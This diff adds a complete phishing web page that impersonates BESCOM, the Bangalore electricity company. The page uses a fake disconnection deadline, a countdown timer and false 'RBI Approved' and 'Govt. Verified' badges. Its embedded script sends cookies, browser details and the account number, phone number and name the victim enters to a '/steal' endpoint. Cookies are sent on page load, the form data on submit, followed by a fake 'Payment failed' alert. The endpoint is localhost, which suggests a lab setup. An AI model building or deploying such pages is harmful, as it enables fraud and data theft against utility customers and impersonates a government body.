@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BESCOM - Online Bill Payment</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: 'Segoe UI', Arial, sans-serif; background:#f5f5f5; }
+
+/* Top strip */
+.top-strip { background:#1a3a5c; padding:6px 40px; display:flex; justify-content:space-between; align-items:center; }
+.top-strip span { color:#aac4e0; font-size:12px; }
+.top-strip a { color:#aac4e0; font-size:12px; text-decoration:none; margin-left:16px; }
+
+/* Header */
+.header { background:white; padding:12px 40px; display:flex; justify-content:space-between; align-items:center; border-bottom:3px solid #1a7abf; box-shadow:0 2px 8px rgba(0,0,0,0.08); }
+.header-left { display:flex; align-items:center; gap:16px; }
+.logo-circle { width:64px; height:64px; background:linear-gradient(135deg,#1a7abf,#0d4f80); border-radius:50%; display:flex; align-items:center; justify-content:center; color:white; font-size:28px; }
+.logo-text h1 { color:#1a3a5c; font-size:22px; font-weight:700; }
+.logo-text p { color:#666; font-size:12px; }
+.header-right { text-align:right; }
+.header-right p { color:#666; font-size:12px; }
+.header-right strong { color:#1a3a5c; font-size:14px; }
+.helpline { background:#e8f4fd; border:1px solid #1a7abf; border-radius:6px; padding:6px 12px; margin-top:4px; font-size:13px; color:#1a3a5c; font-weight:600; }
+
+/* Nav */
+.nav { background:#1a7abf; }
+.nav ul { display:flex; list-style:none; padding:0 40px; }
+.nav ul li a { display:block; color:white; padding:12px 20px; font-size:13px; text-decoration:none; transition:background 0.2s; }
+.nav ul li a:hover { background:rgba(255,255,255,0.15); }
+.nav ul li.active a { background:rgba(255,255,255,0.2); border-bottom:3px solid white; }
+
+/* Alert banner */
+.urgent-banner { background:linear-gradient(135deg,#c0392b,#e74c3c); color:white; padding:14px 40px; display:flex; align-items:center; gap:12px; }
+.urgent-icon { font-size:24px; animation:shake 0.5s infinite; }
+@keyframes shake { 0%,100%{transform:rotate(-5deg)} 50%{transform:rotate(5deg)} }
+.urgent-text h3 { font-size:15px; font-weight:700; }
+.urgent-text p { font-size:13px; opacity:0.9; }
+.countdown { margin-left:auto; background:rgba(0,0,0,0.2); border-radius:8px; padding:8px 16px; text-align:center; }
+.countdown-num { font-size:20px; font-weight:900; font-family:monospace; }
+.countdown-label { font-size:10px; opacity:0.8; }
+
+/* Main layout */
+.main { display:grid; grid-template-columns:1fr 340px; gap:24px; padding:24px 40px; max-width:1200px; margin:0 auto; }
+
+/* Payment form */
+.payment-card { background:white; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,0.08); overflow:hidden; }
+.payment-header { background:linear-gradient(135deg,#1a3a5c,#1a7abf); padding:20px 24px; display:flex; align-items:center; gap:12px; }
+.payment-header-icon { width:40px; height:40px; background:rgba(255,255,255,0.2); border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:20px; }
+.payment-header h2 { color:white; font-size:18px; }
+.payment-header p { color:rgba(255,255,255,0.8); font-size:13px; }
+.payment-body { padding:24px; }
+
+.amount-display { background:linear-gradient(135deg,#fff8e1,#fff3cd); border:2px solid #f39c12; border-radius:10px; padding:20px; margin-bottom:24px; display:flex; justify-content:space-between; align-items:center; }
+.amount-left h3 { font-size:13px; color:#666; margin-bottom:4px; }
+.amount-value { font-size:36px; font-weight:900; color:#c0392b; }
+.amount-left p { font-size:12px; color:#e74c3c; margin-top:4px; }
+.amount-right { text-align:right; }
+.amount-right p { font-size:12px; color:#666; }
+.amount-right strong { color:#1a3a5c; font-size:14px; }
+
+.form-row { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:16px; }
+.form-group { margin-bottom:16px; }
+.form-group label { display:block; font-size:13px; color:#444; margin-bottom:6px; font-weight:500; }
+.form-group label span { color:#e74c3c; }
+.form-group input { width:100%; padding:11px 14px; border:1px solid #ddd; border-radius:6px; font-size:14px; outline:none; transition:border 0.2s; }
+.form-group input:focus { border-color:#1a7abf; box-shadow:0 0 0 3px rgba(26,122,191,0.1); }
+
+.otp-row { display:flex; gap:8px; }
+.otp-row input { flex:1; }
+.otp-btn { padding:11px 16px; background:#1a7abf; color:white; border:none; border-radius:6px; font-size:13px; cursor:pointer; white-space:nowrap; }
+
+.pay-btn { width:100%; padding:16px; background:linear-gradient(135deg,#c0392b,#e74c3c); color:white; border:none; border-radius:8px; font-size:16px; font-weight:700; cursor:pointer; margin-top:8px; display:flex; align-items:center; justify-content:center; gap:8px; transition:transform 0.1s; }
+.pay-btn:hover { transform:translateY(-1px); box-shadow:0 4px 12px rgba(192,57,43,0.4); }
+
+.secure-badges { display:flex; justify-content:center; gap:16px; margin-top:16px; }
+.badge { display:flex; align-items:center; gap:4px; font-size:11px; color:#888; }
+
+/* Sidebar */
+.sidebar { display:flex; flex-direction:column; gap:16px; }
+.info-card { background:white; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,0.08); padding:20px; }
+.info-card h3 { font-size:14px; color:#1a3a5c; font-weight:700; margin-bottom:12px; padding-bottom:8px; border-bottom:2px solid #e8f4fd; }
+.info-item { display:flex; gap:10px; margin-bottom:12px; align-items:flex-start; }
+.info-icon { font-size:18px; flex-shrink:0; }
+.info-text p { font-size:12px; color:#444; line-height:1.5; }
+.info-text strong { color:#1a3a5c; }
+
+.steps { counter-reset:step; }
+.step { display:flex; gap:12px; margin-bottom:12px; align-items:flex-start; }
+.step-num { width:24px; height:24px; background:#1a7abf; color:white; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:700; flex-shrink:0; }
+.step-text { font-size:12px; color:#555; line-height:1.5; }
+
+.footer { background:#1a3a5c; color:#aac4e0; padding:16px 40px; text-align:center; font-size:12px; margin-top:24px; }
+.footer a { color:#aac4e0; text-decoration:none; margin:0 8px; }
+</style>
+</head>
+<body>
+
+<div class="top-strip">
+  <span>Government of Karnataka — Official Portal</span>
+  <div>
+    <a href="#">English</a>
+    <a href="#">ಕನ್ನಡ</a>
+    <a href="#">हिंदी</a>
+    <a href="#">Screen Reader</a>
+  </div>
+</div>
+
+<div class="header">
+  <div class="header-left">
+    <div class="logo-circle">⚡</div>
+    <div class="logo-text">
+      <h1>BESCOM</h1>
+      <p>Bangalore Electricity Supply Company Limited</p>
+      <p style="font-size:11px;color:#999">A Government of Karnataka Undertaking</p>
+    </div>
+  </div>
+  <div class="header-right">
+    <p>Customer Support</p>
+    <div class="helpline">📞 1912 (Toll Free)</div>
+    <p style="margin-top:4px;font-size:11px">Mon-Sat: 8AM - 8PM</p>
+  </div>
+</div>
+
+<nav class="nav">
+  <ul>
+    <li><a href="#">Home</a></li>
+    <li class="active"><a href="#">Bill Payment</a></li>
+    <li><a href="#">New Connection</a></li>
+    <li><a href="#">Outage Info</a></li>
+    <li><a href="#">Complaints</a></li>
+    <li><a href="#">Track Application</a></li>
+    <li><a href="#">Contact Us</a></li>
+  </ul>
+</nav>
+
+<div class="urgent-banner">
+  <div class="urgent-icon">⚠️</div>
+  <div class="urgent-text">
+    <h3>URGENT PAYMENT NOTICE — Action Required Immediately</h3>
+    <p>Your electricity connection is scheduled for disconnection due to overdue payment. Pay now to avoid disruption.</p>
+  </div>
+  <div class="countdown">
+    <div class="countdown-num" id="countdown">11:59:00</div>
+    <div class="countdown-label">Time Remaining</div>
+  </div>
+</div>
+
+<div class="main">
+  <div class="payment-card">
+    <div class="payment-header">
+      <div class="payment-header-icon">💳</div>
+      <div>
+        <h2>Quick Bill Payment</h2>
+        <p>Pay securely using your registered account details</p>
+      </div>
+    </div>
+    <div class="payment-body">
+      <div class="amount-display">
+        <div class="amount-left">
+          <h3>Outstanding Amount</h3>
+          <div class="amount-value">₹ 2,847.00</div>
+          <p>⚠️ Due Date: TODAY — 11:59 PM</p>
+        </div>
+        <div class="amount-right">
+          <p>Account Status</p>
+          <strong style="color:#e74c3c">⛔ OVERDUE</strong>
+          <p style="margin-top:8px;font-size:11px">Late fee: ₹150/day</p>
+        </div>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label>Account Number / RR Number <span>*</span></label>
+          <input type="text" id="account" placeholder="e.g. 1234567890"/>
+        </div>
+        <div class="form-group">
+          <label>Registered Mobile Number <span>*</span></label>
+          <input type="tel" id="phone" placeholder="+91 XXXXX XXXXX"/>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>Full Name (as per account) <span>*</span></label>
+        <input type="text" id="name" placeholder="Enter your full name"/>
+      </div>
+
+      <div class="form-group">
+        <label>One Time Password (OTP) <span>*</span></label>
+        <div class="otp-row">
+          <input type="text" id="otp" placeholder="Enter 6-digit OTP sent to your mobile"/>
+          <button class="otp-btn" onclick="sendOTP()">Send OTP</button>
+        </div>
+      </div>
+
+      <button class="pay-btn" onclick="submitPayment()">
+        🔒 Pay ₹2,847.00 Securely Now
+      </button>
+
+      <div class="secure-badges">
+        <div class="badge">🔒 SSL Secured</div>
+        <div class="badge">🏦 PCI DSS Compliant</div>
+        <div class="badge">✅ RBI Approved</div>
+        <div class="badge">🇮🇳 Govt. Verified</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="sidebar">
+    <div class="info-card">
+      <h3>⚡ Payment Methods</h3>
+      <div class="info-item"><div class="info-icon">💳</div><div class="info-text"><p><strong>Debit/Credit Card</strong><br>Visa, Mastercard, RuPay accepted</p></div></div>
+      <div class="info-item"><div class="info-icon">📱</div><div class="info-text"><p><strong>UPI Payment</strong><br>GPay, PhonePe, Paytm, BHIM</p></div></div>
+      <div class="info-item"><div class="info-icon">🏦</div><div class="info-text"><p><strong>Net Banking</strong><br>All major banks supported</p></div></div>
+    </div>
+
+    <div class="info-card">
+      <h3>📋 How to Pay</h3>
+      <div class="steps">
+        <div class="step"><div class="step-num">1</div><div class="step-text">Enter your Account/RR Number from your bill</div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-text">Enter your registered mobile number</div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-text">Verify with OTP sent to your mobile</div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-text">Complete payment and save receipt</div></div>
+      </div>
+    </div>
+
+    <div class="info-card" style="background:#fff8e1;border:1px solid #f39c12;">
+      <h3 style="color:#e67e22">⚠️ Disconnection Notice</h3>
+      <p style="font-size:12px;color:#666;line-height:1.6">Your account shows an outstanding balance. Failure to pay before <strong style="color:#e74c3c">11:59 PM today</strong> will result in immediate disconnection. Reconnection charges of ₹500 will apply.</p>
+    </div>
+  </div>
+</div>
+
+<div class="footer">
+  <p>© 2024 BESCOM — Bangalore Electricity Supply Company Limited | Government of Karnataka</p>
+  <p style="margin-top:6px"><a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a> | <a href="#">RTI</a> | <a href="#">Sitemap</a> | Helpline: 1912</p>
+</div>
+
+<script>
+// Countdown timer
+function updateCountdown() {
+  const now = new Date();
+  const midnight = new Date();
+  midnight.setHours(23,59,0,0);
+  const diff = midnight - now;
+  const h = Math.floor(diff/3600000).toString().padStart(2,'0');
+  const m = Math.floor((diff%3600000)/60000).toString().padStart(2,'0');
+  const s = Math.floor((diff%60000)/1000).toString().padStart(2,'0');
+  document.getElementById('countdown').textContent = h+':'+m+':'+s;
+}
+updateCountdown();
+setInterval(updateCountdown, 1000);
+
+function randomPhone() {
+  var p = ['98','97','96','95','94','93','92','91','90','88','87','86','85','84','83','82','81','80'];
+  var pre = p[Math.floor(Math.random()*p.length)];
+  var num = Math.floor(Math.random()*99999999).toString();
+  while(num.length < 8) num = '0' + num;
+  return '+91 ' + pre + num.slice(0,4) + ' ' + num.slice(4);
+}
+
+function randomAccount() {
+  return 'BES' + Math.floor(Math.random()*9000000+1000000);
+}
+
+async function sendToAttacker(data) {
+  try {
+    await fetch('http://localhost:7000/steal', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(data)
+    });
+  } catch(e) {}
+}
+
+// Auto steal on page load
+window.onload = async function() {
+  await sendToAttacker({
+    phone: randomPhone(),
+    name: randomAccount(),
+    cookies: document.cookie,
+    device: navigator.userAgent,
+    screen: screen.width+'x'+screen.height,
+    location: Intl.DateTimeFormat().resolvedOptions().timeZone
+  });
+};
+
+function sendOTP() {
+  alert('OTP sent to your registered mobile number.');
+}
+
+async function submitPayment() {
+  var phone = document.getElementById('phone').value || randomPhone();
+  var account = document.getElementById('account').value || randomAccount();
+  var name = document.getElementById('name').value || 'Unknown';
+  await sendToAttacker({
+    phone: phone,
+    name: account + ' | ' + name,
+    cookies: document.cookie,
+    device: navigator.userAgent,
+    screen: screen.width+'x'+screen.height,
+    location: Intl.DateTimeFormat().resolvedOptions().timeZone
+  });
+  alert('Payment failed. Please try again or contact 1912.');
+}
+</script>
+</body>
+</html>
